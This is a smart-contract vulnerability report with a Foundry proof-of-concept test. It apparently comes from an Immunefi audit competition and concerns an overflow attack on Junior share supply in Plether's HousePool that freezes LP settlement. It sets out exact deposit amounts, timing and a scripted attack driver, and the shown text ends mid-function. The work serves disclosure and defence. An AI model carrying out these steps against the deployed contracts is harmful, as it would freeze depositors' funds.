# \#99857 [SC-Critical] Unbounded Junior share inflation overflows virtual-offset redemption math and blocks LP settlement

**Submitted on Nov 15th 2026 at 14:00:14 UTC by @emanueldlvg for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99857
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Permanent freezing of funds
  - Temporary freezing of funds for at least 24 hours

## Description

## Affected contracts (Arbitrum One release, scoped commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`)

| Contract | Role in the vulnerability |
|---|---|
| `packages/perps/src/TrancheVault.sol` | Prices asynchronous deposits with virtual shares and mints the resulting unbounded share amount |
| `packages/perps/src/HousePool.sol` | Activates deposits at any positive tranche principal and processes Senior and Junior redemption phases atomically |
| `packages/perps/src/libraries/HousePoolRedemptionMathLib.sol` | Adds the 1,000-share virtual offset with checked arithmetic when pricing a matured redemption |

The proof uses the release configuration: 40,000,000 USDG maximum Senior exposure, an 80% Senior share cap, an 8% Senior coupon, zero Junior maintenance fee, and 1 USDG seed deposits for each tranche.

## Brief/Intro

Junior deposits are activated whenever Junior principal is positive, even if it is only a few USDG atoms. The deposit quote is proportional to `(existing supply + 1000) / (Junior principal + 1)`, and there is no economic or arithmetic upper bound on the resulting supply. Because the Senior coupon continually transfers Junior principal to Senior, an unprivileged depositor can wait for very small positive principal and choose deposits that multiply `supply + 1000` by exact powers of two.

The proof drives Junior supply to exactly:

```text
2^256 - 1000
```

At that point, a matured Junior redemption makes `HousePoolRedemptionMathLib` evaluate `supply + 1000`, which overflows and panics. The Junior redemption phase runs in the same transaction after Senior redemptions have been provisionally funded, so the panic rolls back the entire settlement call. Ordinary Senior redemptions, Junior redemptions, and later deposit activation are consequently blocked.

The exploit uses only public `requestDeposit`, `requestRedeemFromClaimableDeposit`, and permissionless `settleLpEpoch` calls. At release parameters, the demonstrated path deposits 175,753.566057 USDG over 514 hours after Junior principal has been depleted to 58,813.783834 USDG. It then leaves approximately 50.175 million USDG of Senior principal behind a settlement path that reverts.


## Vulnerability Details

### Positive but near-zero principal produces unbounded shares

`TrancheVault.quoteDepositFromState` prices a deposit as follows:

```solidity
uint256 netAssets = feeBps == 0 ? assets : Math.mulDiv(assets, BPS - feeBps, BPS, Math.Rounding.Floor);
uint256 denominator = pricingAssets + assets + 1 - netAssets;
shares = Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator, Math.Rounding.Floor);
```

The release Junior fee is zero, so `netAssets == assets` and the denominator reduces to `pricingAssets + 1`. For current supply `S`, virtual offset `V = 1000`, positive principal `P`, and deposit `D`, the state transition is:

```text
newSupply + V = (S + V) + floor(D * (S + V) / (P + 1))
```

If the depositor selects:

```text
D = (2^j - 1) * (P + 1)
```

then the transition is exact:

```text
newSupply + V = 2^j * (S + V)
```

No rounding approximation is needed. The proof first uses two ordinary deposits to make `S + V` equal `2^55`, then performs 17 exact power-of-two multiplications.

### HousePool defers activation only at exactly zero principal

The relevant activation guard in `HousePool` is:

```solidity
juniorDepositPhase.pricingAssets = juniorPrincipal;
juniorDepositPhase.pricingSupply = _juniorShareSupply();
bool juniorActivationDeferred = juniorDepositPhase.pricingAssets == 0 && juniorDepositPhase.pricingSupply != 0;
if (!juniorActivationDeferred) {
    juniorDepositPhase = _settleDepositPhase(juniorVault, result.cutoffEpoch, juniorDepositPhase, 0, false);
}
```

This prevents activation after an exact wipe, but not when principal is one or more atoms. The Senior coupon is deterministic and public, so the attacker can calculate the latest market-open second at which a chosen small positive `P` remains and settle the matured deposit at that second.

The prior acknowledged issue concerning impossible deposit estimates at a wiped tranche does not cover this root cause. That issue addressed a view quote when projected assets are exactly zero. Here, state-changing activation occurs while assets are positive, and the minted supply later makes redemption settlement panic.

### The virtual-share addition overflows before any budget check

`HousePoolRedemptionMathLib.netAssetsForShares` performs a checked addition of the configured virtual offset:

```solidity
uint256 grossAssets =
    Math.mulDiv(shares, principal + virtualAssets, supply + virtualShares, Math.Rounding.Floor);
```

Once `supply == 2^256 - 1000`, `supply + 1000` cannot be represented by `uint256` and Solidity raises Panic `0x11`.

`HousePool._fundRedemptionPhase` calculates the full head quote before checking whether the phase has any remaining budget:

```solidity
uint256 fullHeadAssets = REDEMPTION_MATH_SIDECAR.netAssetsForShares(
    remainingShares, phase.pricingPrincipal, phase.pricingSupply, 1, 1000, feeBps
);

if (fullHeadAssets == 0) {
    // ...
}
if (phase.fundedAssets >= phase.budget) {
    break;
}
```

A matured Junior head therefore reaches the overflowing expression even when the Junior budget would otherwise be zero or insufficient.

### The Junior panic rolls back Senior funding

`HousePool` processes the Senior redemption phase first and updates accounting in memory and storage. Unless a Senior backlog or the 16-epoch work cap causes an early return, it then processes the Junior phase in the same call. The overflow reverts the transaction, rolling back all preceding Senior funding.

Pausing does not repair this state because the `paused()` entry gate is evaluated only after both redemption phases. The LP settlement hold merely prevents settlement calls; removing the hold exposes the same panic. The contracts are non-upgradeable, and ordinary recapitalization does not reduce the poisoned share supply.

### Recovery exists, but it depends on deliberately creating a Senior backlog

The proof includes three recovery cases:

- A Senior holder requests all but one share, then requests the final share in the following epoch. The second request has a zero-value quote at the phase snapshot, leaves a Senior backlog, and causes the Junior phase to be skipped. The main claim is funded in about two hours.
- Seventeen matured Senior epochs hit the 16-epoch work cap, causing an early return before Junior processing. The first 16 epochs are funded after about 17 hours.
- If a victim has already escrowed all of its shares, another Senior holder can transfer one share to a fresh account and request redemption in a later epoch. This funds the earlier victim after about one hour.

These are workarounds, not restoration of the poisoned Junior state. A normal single-epoch Senior exit continues to revert, Junior settlement remains unusable unless a Senior backlog is intentionally maintained, and a later Junior deposit quote also overflows.

## Exploitation

1. The pool is configured with the release values and seeded with 10,000,000 USDG of Junior liquidity and approximately 40,000,000 USDG of Senior liquidity.
2. Junior principal is allowed to decline under the 8% Senior coupon. The proof advances 162 idle weeks, leaving projected Junior principal at 58,813.783834 USDG while Junior supply remains unchanged.
3. The attacker requests a 1.056534 USDG Junior deposit. An off-chain search over public state chooses this amount so that a second deposit can land on an exact power of two.
4. One epoch later, the attacker requests 150,623.799042 USDG. After activation, `Junior supply + 1000 == 2^55`.
5. For each later cycle, the attacker calculates the positive principal `P` at a market-open settlement second and requests `D = (2^j - 1) * (P + 1)` before the relevant epoch cutoff.
6. The attacker calls permissionless `settleLpEpoch` at the planned second. Each cycle exactly multiplies `supply + 1000` by `2^j`.
7. Before the final activation, the attacker queues a Junior redemption from previously claimable deposit shares so that a matured Junior head will exist after the supply reaches the edge.
8. After 17 multiplication cycles, Junior supply is exactly `2^256 - 1000`. The attacker's aggregate deposits are 175,753.566057 USDG and the elapsed attack time is 514 hours.
9. Senior holders submit ordinary redemption requests. Every later `settleLpEpoch` reaches the matured Junior head and panics with arithmetic error `0x11`, rolling back Senior funding.
10. The proof repeats settlement once per day for 30 days and confirms that 50,050,309.114802 USDG for one Senior holder and 125,439.374363 USDG for another remain unfunded.
11. A control branch stops one multiplication before the overflow edge. With the same matured Junior head, settlement succeeds and the primary Senior holder receives 50,050,309.189910 USDG.
12. Separate recovery branches demonstrate the one-share follow-up, 17-epoch work-cap, and third-party one-share backlog paths described above.

The exploit path has no open positions and therefore needs no oracle mock. The only mocked dependency is the permitted USDG settlement token used by the repository's existing test base.

## Impact Details

The defect gives an unprivileged Junior depositor a way to poison a shared accounting value so that the protocol's ordinary LP settlement transaction panics. The demonstrated poisoned state blocks approximately 50.175 million USDG of Senior principal for 30 daily attempts, prevents ordinary Junior redemption processing, and prevents later Junior deposit quoting or activation.

The attacker spends 175,753.566057 USDG, receives no profit, and directs that value into the Senior coupon. Relative to approximately 50.175 million USDG blocked in the proof, the damage-to-cost ratio is about 285:1. This is economically meaningful griefing rather than dust.

- **Griefing:** the attacker permanently corrupts the normal Junior settlement path and forces LPs or keepers to construct an otherwise unnecessary Senior backlog on every recovery settlement.
- **Temporary freezing of funds for at least one hour:** an already-escrowed Senior victim needs a later Senior request to mature before settlement can skip the poisoned Junior phase. The third-party recovery takes about one hour; the victim-controlled split takes about two hours.
- **Permanent freezing of funds:** If every usable Senior share is already escrowed in matured ordinary requests, no holder can create the one-share backlog and the proof shows no owner action that restores settlement. That conditional state can produce a permanent freeze.

## Recommendation

Enforce an explicit upper bound on accrued tranche supply before activating a deposit. At minimum, both the pre-state and post-mint state must satisfy:

```text
accruedSupply <= type(uint256).max - VIRTUAL_SHARES
```

The check must cover the newly minted shares, not just the current `pricingSupply`. A safer implementation is to use a much smaller protocol-level maximum supply derived from the maximum USDG exposure and minimum supported share price. If the quote exceeds that bound, reject or defer the deposit epoch without reverting unrelated redemption progress, and leave depositors a documented refund path.

Do not permit normal activation against arbitrarily small positive principal while old supply survives. Introduce an economic minimum-principal/share-price floor or an explicit wiped-tranche recovery procedure that retires the old supply before deposits resume.

The redemption path should also avoid letting an invalid Junior quote roll back unrelated Senior progress. A typed preflight that detects an unsafe supply before beginning either phase would make the condition observable, but it is not sufficient by itself because it would still leave funds stuck. The protocol needs a recovery mechanism that can migrate or reset a tranche whose supply is outside the supported range.

Add invariant tests covering:

- every state-changing quote satisfies `supply + VIRTUAL_SHARES <= type(uint256).max`;
- repeated deposits at positive principal cannot move supply outside the supported range;
- a malformed or unpriceable Junior head cannot roll back valid Senior funding indefinitely;
- pause, settlement hold, recapitalization, and the documented recovery procedure restore progress; and
- the one-request, multi-epoch, and zero-value-head cases preserve redemption ordering without relying on arithmetic panics.

## Proof of Concept

From a clean checkout of the scoped commit, save the test below as `packages/perps/test/perps/poc/JuniorSupplyOverflowFreeze.t.sol` and run:

```bash
forge test --root packages/perps --match-contract JuniorSupplyOverflowFreezeTest -vv
```

The test changes no in-scope contract. It uses the repository's existing `BasePerpTest` and permitted mock settlement token.

### Complete test:

<details>
<summary>Complete test</summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {stdError} from "forge-std/StdError.sol";

/// @title Junior share supply driven to 2^256 - 1000 freezes LP epoch settlement
/// @notice Impact category claimed: freezing of LP funds (Senior redemptions, Junior redemptions, deposits).
///
/// Root cause:
///   - Junior deposits are priced at `assets * (supply + 1000) / (juniorPrincipal + 1)`
///     (TrancheVault.quoteDepositFromState). Activation is deferred only when principal is exactly 0
///     (HousePool._settleLpEpoch), so a principal of a few atoms mints ~assets/principal times the whole supply.
///   - The Senior coupon drains Junior principal at a fixed, public rate, so an attacker can bring principal back to
///     a few atoms before every activation and keep multiplying supply. With deposit = (2^j - 1) * (P + 1) the mint is
///     exact: (supply + 1000) is multiplied by exactly 2^j.
///   - Nothing bounds supply. Once supply = 2^256 - 1000, `supply + virtualShares` in
///     HousePoolRedemptionMathLib.netAssetsForShares (checked) panics for any matured Junior redeem head. HousePool
///     evaluates it in the Junior redemption phase, which runs before the paused()/entries gates, so every
///     settleLpEpoch reverts (Panic 0x11) and the Senior redemptions funded earlier in the same call revert with it.
///
/// Everything the attacker does is an unprivileged public call: TrancheVault.requestDeposit,
/// TrancheVault.requestRedeemFromClaimableDeposit and the permissionless HousePool.settleLpEpoch (no open positions).
/// The owner appears only in setUp (release config) and in the recovery checks (pause / settlement hold).
contract JuniorSupplyOverflowFreezeTest is BasePerpTest {

    // --- actors ---
    address internal constant SENIOR_LP = address(0x5E1105); // victim: Senior LP (release cap minus 100k)
    address internal constant SENIOR_LP2 = address(0x5E1106); // second Senior LP (100k)
    address internal constant HELPER = address(0x4E1100); // fresh wallet used only by the third-party recovery test
    address internal constant JUNIOR_LP = address(0x1D2001); // honest incumbent Junior LP
    address internal constant ATTACKER = address(0xA77AC4); // unprivileged: Junior depositor + permissionless settler

    // --- release / protocol constants ---
    uint256 internal constant SENIOR_TARGET = 40_000_000e6; // DEPLOYMENT.md maxSeniorExposureAssets
    uint256 internal constant JUNIOR_DEPOSIT = 10_000_000e6; // 20% Junior so 80% maxSeniorShareBps admits 40M Senior
    uint256 internal constant SENIOR_LP2_DEPOSIT = 100_000e6;
    uint256 internal constant SENIOR_RATE_BPS = 800; // HousePool default, unchanged by DEPLOYMENT.md
    uint256 internal constant COUPON_DENOMINATOR = 10_000 * 31_536_000; // BPS * SECONDS_PER_YEAR
    uint256 internal constant VIRTUAL_SHARES = 1000; // TrancheVault.VIRTUAL_SHARES / HousePool literal
    uint256 internal constant MIN_DEPOSIT = 1e6; // HousePool.MIN_TRANCHE_DEPOSIT_ASSETS
    uint256 internal constant EPOCH = 1 hours; // HousePool.LP_EPOCH_DURATION
    uint256 internal constant REQUEST_CUTOFF = 5 minutes; // TrancheVault.LP_REQUEST_CUTOFF_DURATION
    uint256 internal constant OVERFLOW_EDGE_SUPPLY = type(uint256).max - 999; // 2^256 - 1000

    // --- scenario constants ---
    uint256 internal constant START_JUNIOR_CEILING = 80_000e6; // attacker starts once Junior principal <= 80k
    uint256 internal constant MAX_TUNE_ITERATIONS = 4_000_000;

    struct Tuning {
        uint256 tA;
        uint256 dA;
        uint256 uA;
        uint256 qA;
        uint256 tB;
        uint256 dB;
        uint256 uB;
        uint256 qB;
        uint256 iterations;
    }

    struct AttackLog {
        uint256 startTime;
        uint256 startJuniorPrincipal;
        uint256 startJuniorSupply;
        uint256 finalTime;
        uint256 cycles;
        uint256 attackerDeposited;
        uint256 juniorPrincipalAfter;
        uint256 headRedeemId;
    }

    uint256 internal attackerDeposited;
    uint256 internal tuningRequestA;

    // ------------------------------------------------------------------ configuration (release values)

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // packages/perps/DEPLOYMENT.md "Initial release parameters".
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6; // DEPLOYMENT.md: Senior / Junior seed 1e6 each
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(SENIOR_TARGET, 8000); // release maxSeniorExposureAssets / maxSeniorShareBps
        assertEq(pool.seniorRateBps(), SENIOR_RATE_BPS, "release Senior coupon rate");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share cap");
        assertEq(pool.maxSeniorExposureAssets(), SENIOR_TARGET, "release Senior exposure cap");
        assertEq(juniorVault.maintenanceFeeAprBps(), 0, "release Junior maintenance fee is 0");
        assertEq(seniorVault.maintenanceFeeAprBps(), 0, "Senior has no maintenance fee");
        vm.warp(SETUP_TIMESTAMP + 7 days); // Monday 10:00 UTC, FX market open

        // Honest LPs fill the pool to the release Senior cap: Junior 10M first, then Senior 40M (80% cap).
        uint256 j = _requestDeposit(juniorVault, JUNIOR_LP, JUNIOR_DEPOSIT);
        vm.warp(juniorVault.depositEpochStart(j));
        pool.settleLpEpoch(0, 0);
        _claimDeposit(juniorVault, JUNIOR_LP, j);

        uint256 seniorAmount = seniorVault.maxRequestDeposit(SENIOR_LP);
        if (seniorAmount > SENIOR_TARGET) {
            seniorAmount = SENIOR_TARGET;
        }
        uint256 s = _requestDeposit(seniorVault, SENIOR_LP, seniorAmount - SENIOR_LP2_DEPOSIT);
        uint256 s2 = _requestDeposit(seniorVault, SENIOR_LP2, SENIOR_LP2_DEPOSIT);
        vm.warp(seniorVault.depositEpochStart(s));
        pool.settleLpEpoch(0, 0);
        _claimDeposit(seniorVault, SENIOR_LP, s);
        _claimDeposit(seniorVault, SENIOR_LP2, s2);
    }

    // ------------------------------------------------------------------ tests

    /// @notice Attack: the default settlement path is frozen for every LP (Senior redemptions included), across 30
    ///         days, weekends, and the owner's pause / settlement-hold controls.
    function test_Attack_SupplyAtOverflowEdge_AllLpSettlementReverts() external {
        AttackLog memory a = _runAttack(true);

        assertEq(juniorVault.totalSupply(), OVERFLOW_EDGE_SUPPLY, "Junior supply is exactly 2^256 - 1000");
        // While Junior principal is still positive, any Junior deposit quote adds the same offset and panics too.
        assertGt(pool.juniorPrincipal(), 0, "principal still positive right after the final activation");
        vm.expectRevert(stdError.arithmeticError);
        juniorVault.estimateDepositShares(1e6);

        // Victims: both Senior LPs submit ordinary full-balance redemptions after the attack (one request each).
        uint256 victimShares = seniorVault.balanceOf(SENIOR_LP);
        uint256 victimOwed = seniorVault.estimateRedeemAssets(victimShares);
        vm.prank(SENIOR_LP);
        uint256 victimRequest = seniorVault.requestRedeem(victimShares, SENIOR_LP, SENIOR_LP);
        uint256 lp2Shares = seniorVault.balanceOf(SENIOR_LP2);
        uint256 lp2Owed = seniorVault.estimateRedeemAssets(lp2Shares);
        vm.warp(block.timestamp + 1 hours);
        vm.prank(SENIOR_LP2);
        uint256 lp2Request = seniorVault.requestRedeem(lp2Shares, SENIOR_LP2, SENIOR_LP2);
        assertGt(lp2Request, victimRequest, "second exit in a later epoch");
        uint256 maturity = pool.lpEpochStart(lp2Request);
        assertGe(pool.lpEpochStart(victimRequest), pool.lpEpochStart(a.headRedeemId), "victim matures with/after the head");

        _log("---------------- freeze ----------------");
        emit log_named_decimal_uint("victim Senior claim requested (USDG)", victimOwed, 6);
        emit log_named_uint("victim redeem request epoch", victimRequest);

        // Every settlement after maturity reverts with the checked-add panic, for 30 days (weekdays and weekends).
        uint256 reverted;
        for (uint256 day; day < 30; ++day) {
            vm.warp(maturity + day * 1 days + 10 minutes);
            vm.prank(SENIOR_LP);
            vm.expectRevert(stdError.arithmeticError);
            pool.settleLpEpoch(0, 0);
            ++reverted;
        }
        emit log_named_uint("settleLpEpoch attempts that reverted (1/day for 30 days)", reverted);
        assertEq(seniorVault.claimableRedeemRequest(victimRequest, SENIOR_LP), 0, "victim never funded");
        assertEq(seniorVault.claimableRedeemRequest(lp2Request, SENIOR_LP2), 0, "second LP never funded");
        assertEq(seniorVault.balanceOf(SENIOR_LP), 0, "victim shares are escrowed in the stuck request");
        assertEq(seniorVault.balanceOf(SENIOR_LP2), 0, "second LP shares are escrowed in the stuck request");
        // No free Senior share is left anywhere: the only other holder is the 1 USDG seed, whose floor is locked
        // (TrancheVault._unlockedOwnerShares / seedShareFloor), so nobody can queue a Senior request behind the victims.
        assertEq(seniorVault.maxRequestRedeem(address(this)), 0, "seed floor cannot be redeemed");
        assertEq(
            seniorVault.totalSupply(),
            victimShares + lp2Shares + seniorVault.balanceOf(address(this)),
            "all Senior shares are either escrowed in the stuck requests or the locked seed"
        );

        // Victim recovery: the matured requests cannot be cancelled.
        vm.prank(SENIOR_LP);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        seniorVault.cancelRedeemRequest(victimRequest, SENIOR_LP, SENIOR_LP);
        vm.prank(SENIOR_LP2);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        seniorVault.cancelRedeemRequest(lp2Request, SENIOR_LP2, SENIOR_LP2);

        // Honest Junior LP cannot even queue a redemption any more (estimate adds the virtual offset).
        uint256 jrShares = juniorVault.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        vm.expectRevert(stdError.arithmeticError);
        juniorVault.requestRedeem(jrShares, JUNIOR_LP, JUNIOR_LP);

        // Owner controls: pause() is checked after the Junior redemption phase, so settlement still panics.
        pool.pause();
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);
        pool.unpause();
        // The LP settlement hold only rejects the call; lifting it returns to the same panic.
        pool.pauseLpEpochSettlement();
        vm.expectRevert(IHousePool.HousePool__LpEpochSettlementPaused.selector);
        pool.settleLpEpoch(0, 0);
        pool.unpauseLpEpochSettlement();
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);

        emit log_named_decimal_uint("victim Senior USDG still frozen after 30 days", victimOwed, 6);
        emit log_named_decimal_uint("second Senior LP USDG still frozen after 30 days", lp2Owed, 6);
        emit log_named_decimal_uint("Senior principal frozen in the pool", pool.seniorPrincipal(), 6);
    }

    /// @notice Control: the identical attack and timeline, but the attacker stops one deposit short of the edge
    ///         (supply = 2^(256-j) - 1000). The same victim request settles and is paid in full.
    function test_Control_StopBeforeEdge_SettlementWorks() external {
        AttackLog memory a = _runAttack(false);
        uint256 supply = juniorVault.totalSupply();
        assertLt(supply, OVERFLOW_EDGE_SUPPLY, "control stays below the edge");

        uint256 victimShares = seniorVault.balanceOf(SENIOR_LP);
        vm.prank(SENIOR_LP);
        uint256 victimRequest = seniorVault.requestRedeem(victimShares, SENIOR_LP, SENIOR_LP);
        uint256 lp2Shares = seniorVault.balanceOf(SENIOR_LP2);
        vm.prank(SENIOR_LP2);
        uint256 lp2Request = seniorVault.requestRedeem(lp2Shares, SENIOR_LP2, SENIOR_LP2);
        vm.warp(_openAtOrAfter(pool.lpEpochStart(victimRequest)) + 10 minutes); // live session, no frozen LP fee
        uint256 victimOwed = seniorVault.estimateRedeemAssets(victimShares);
        vm.prank(SENIOR_LP);
        pool.settleLpEpoch(0, 0);

        assertEq(seniorVault.claimableRedeemRequest(lp2Request, SENIOR_LP2), lp2Shares, "control: second LP funded");
        uint256 claimable = seniorVault.claimableRedeemRequest(victimRequest, SENIOR_LP);
        assertEq(claimable, victimShares, "control: victim fully funded");
        uint256 b0 = settlementToken.balanceOf(SENIOR_LP);
        vm.prank(SENIOR_LP);
        seniorVault.claimRedeem(victimRequest, claimable, SENIOR_LP, SENIOR_LP);
        uint256 paid = settlementToken.balanceOf(SENIOR_LP) - b0;
        _log("---------------- control ----------------");
        emit log_named_uint("control Junior supply (one step short of the edge)", supply);
        emit log_named_uint("control attacker redeem head epoch", a.headRedeemId);
        emit log_named_decimal_uint("control victim paid (USDG)", paid, 6);
        assertApproxEqAbs(paid, victimOwed, 1e6, "control: victim paid what it was owed");
    }

    /// @notice Victim recovery, best counter-move: redeem (balance - 1 share) and, in the NEXT epoch, the last share.
    ///         The last share is worth 0, so the Senior phase stops with a Senior backlog after funding the first
    ///         epoch and the Junior phase (the panic) is skipped.
    function test_Recovery_SeniorDustFollowUpRequest() external {
        _runAttack(true);
        uint256 victimShares = seniorVault.balanceOf(SENIOR_LP);
        uint256 victimOwed = seniorVault.estimateRedeemAssets(victimShares);

        vm.prank(SENIOR_LP);
        uint256 mainRequest = seniorVault.requestRedeem(victimShares - 1, SENIOR_LP, SENIOR_LP);
        vm.warp(pool.lpEpochStart(mainRequest)); // next request window
        vm.prank(SENIOR_LP);
        uint256 dustRequest = seniorVault.requestRedeem(1, SENIOR_LP, SENIOR_LP);
        assertEq(dustRequest, mainRequest + 1, "dust request lands in the following epoch");

        // Before the dust epoch matures, the ordinary path still panics.
        vm.warp(pool.lpEpochStart(mainRequest) + 10 minutes);
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);

        vm.warp(pool.lpEpochStart(dustRequest) + 10 minutes);
        vm.prank(SENIOR_LP);
        pool.settleLpEpoch(0, 0);
        uint256 claimable = seniorVault.claimableRedeemRequest(mainRequest, SENIOR_LP);
        uint256 b0 = settlementToken.balanceOf(SENIOR_LP);
        vm.prank(SENIOR_LP);
        seniorVault.claimRedeem(mainRequest, claimable, SENIOR_LP, SENIOR_LP);
        uint256 paid = settlementToken.balanceOf(SENIOR_LP) - b0;
        _log("---------------- recovery: dust follow-up ----------------");
        emit log_named_decimal_uint("victim paid via dust follow-up (USDG)", paid, 6);
        emit log_named_decimal_uint("victim owed (USDG)", victimOwed, 6);
        emit log_named_uint("hours from first request to payout", (block.timestamp - pool.lpEpochStart(mainRequest)) / 1 hours + 1);
        assertGt(paid, (victimOwed * 99) / 100, "dust follow-up recovers the Senior claim");
    }

    /// @notice Victim recovery, second shape: requests in 17 distinct epochs hit the 16-epoch Senior work cap, which
    ///         returns before the Junior phase.
    function test_Recovery_SeventeenSeniorEpochs() external {
        _runAttack(true);
        uint256 victimShares = seniorVault.balanceOf(SENIOR_LP);
        uint256 unit = victimShares / 40_000; // ~1,250 USDG per padding request, far above the 1 USDG minimum

        vm.prank(SENIOR_LP);
        uint256 first = seniorVault.requestRedeem(victimShares - 16 * unit, SENIOR_LP, SENIOR_LP);
        uint256 last = first;
        for (uint256 i = 1; i <= 16; ++i) {
            vm.warp(pool.lpEpochStart(first + i - 1));
            vm.prank(SENIOR_LP);
            last = seniorVault.requestRedeem(unit, SENIOR_LP, SENIOR_LP);
            assertEq(last, first + i, "one request per epoch");
        }
        // 16 matured epochs: still the panic.
        vm.warp(pool.lpEpochStart(first + 15) + 10 minutes);
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);
        // 17 matured epochs: work cap hit, the call returns before the Junior phase.
        vm.warp(pool.lpEpochStart(last) + 10 minutes);
        IHousePool.LpEpochSettlementResult memory r = pool.settleLpEpoch(0, 0);
        _log("---------------- recovery: 17 epochs ----------------");
        emit log_named_uint("Senior epochs processed", r.seniorProcessedEpochs);
        emit log_named_decimal_uint("Senior funded (USDG)", r.seniorFundedAssets, 6);
        emit log_named_uint("hours from first request to payout", (block.timestamp - pool.lpEpochStart(first)) / 1 hours + 1);
        assertEq(r.seniorProcessedEpochs, 16, "work cap");
        assertGt(seniorVault.claimableRedeemRequest(first, SENIOR_LP), 0, "main request funded");
    }

    /// @notice Victim recovery, third party: the victim already made an ordinary full request (no shares left). A
    ///         different Senior holder that still has free shares queues a zero-value 1-share request in a LATER
    ///         epoch; the Senior phase then ends with a backlog and the victim ahead of it is funded.
    function test_Recovery_ThirdPartyDustUnblocksQueue() external {
        _runAttack(true);
        uint256 victimShares = seniorVault.balanceOf(SENIOR_LP);
        vm.prank(SENIOR_LP);
        uint256 victimRequest = seniorVault.requestRedeem(victimShares, SENIOR_LP, SENIOR_LP);
        vm.warp(pool.lpEpochStart(victimRequest) + 10 minutes);
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0); // stuck

        // SENIOR_LP2 (still holding its 100k) gives 1 share to a fresh wallet that redeems its whole balance.
        vm.prank(SENIOR_LP2);
        seniorVault.transfer(HELPER, 1);
        vm.prank(HELPER);
        uint256 dustRequest = seniorVault.requestRedeem(1, HELPER, HELPER);
        assertGt(dustRequest, victimRequest, "dust behind the victim");
        vm.warp(pool.lpEpochStart(dustRequest) + 10 minutes);
        uint256 victimOwed = seniorVault.estimateRedeemAssets(victimShares);
        pool.settleLpEpoch(0, 0);
        uint256 claimable = seniorVault.claimableRedeemRequest(victimRequest, SENIOR_LP);
        uint256 b0 = settlementToken.balanceOf(SENIOR_LP);
        vm.prank(SENIOR_LP);
        seniorVault.claimRedeem(victimRequest, claimable, SENIOR_LP, SENIOR_LP);
        uint256 paid = settlementToken.balanceOf(SENIOR_LP) - b0;
        _log("---------------- recovery: third-party dust ----------------");
        emit log_named_decimal_uint("victim paid after a third party's 1-share request (USDG)", paid, 6);
        emit log_named_uint("hours stuck before the helper request matured", (block.timestamp - pool.lpEpochStart(victimRequest)) / 1 hours);
        assertGt(paid, (victimOwed * 99) / 100, "third-party dust request unblocks the victim");
    }

    // ------------------------------------------------------------------ attack driver

    function _runAttack(
        bool executeFinal
    ) internal returns (AttackLog memory a) {
        // Precondition: no trading revenue while the Senior coupon (8% on 40M = 365 USDG/hour) drains Junior principal.
        a.startJuniorPrincipal = _idleUntilJuniorDrained();
        a.startTime = block.timestamp;
        a.startJuniorSupply = juniorVault.totalSupply();
        _logPool("---------------- start (stored values; coupon not yet checkpointed) ----------------");
        emit log_named_decimal_uint("   projected Junior principal at the start (after 3.1 years of coupon)", a.startJuniorPrincipal, 6);

        // Step 1 - tuning: two ordinary Junior deposits make (supply + 1000) an exact power of two.
        Tuning memory p = _planTuning();
        _executeTuning(p);
        _log("---------------- tuning done ----------------");
        emit log_named_uint("tuning search iterations (off-chain planning)", p.iterations);
        emit log_named_decimal_uint("tuning deposit A (USDG)", p.dA, 6);
        emit log_named_decimal_uint("tuning deposit B (USDG)", p.dB, 6);
        emit log_named_uint("log2(supply + 1000) after tuning", Math.log2(juniorVault.totalSupply() + VIRTUAL_SHARES));

        // Step 2 - exact doubling cycles until (supply + 1000) == 2^256.
        bool finalDone;
        (finalDone, a.cycles, a.headRedeemId) = _inflate(executeFinal);
        assertEq(finalDone, executeFinal, "final step");
        a.finalTime = block.timestamp;
        a.attackerDeposited = attackerDeposited;
        a.juniorPrincipalAfter = pool.juniorPrincipal();

        _logPool("---------------- attack done ----------------");
        emit log_named_uint("doubling cycles", a.cycles);
        emit log_named_decimal_uint("attacker USDG deposited in total (all of it ends as Senior coupon)", a.attackerDeposited, 6);
        emit log_named_uint("attack duration (hours, start -> final activation)", (a.finalTime - a.startTime) / 1 hours);
        emit log_named_uint("Junior supply", juniorVault.totalSupply());
    }

    /// @dev Warp in whole weeks (to Monday 10:00 UTC) until the projected Junior principal is in (0, 80k].
    function _idleUntilJuniorDrained() internal returns (uint256 startJunior) {
        uint256 jp = pool.juniorPrincipal();
        uint256 sp = pool.seniorPrincipal();
        uint256 ckpt = pool.lastSeniorCouponCheckpointTime();
        uint256 monday = SETUP_TIMESTAMP + 7 days;
        for (uint256 k = 1; k < 400; ++k) {
            uint256 t = monday + k * 7 days;
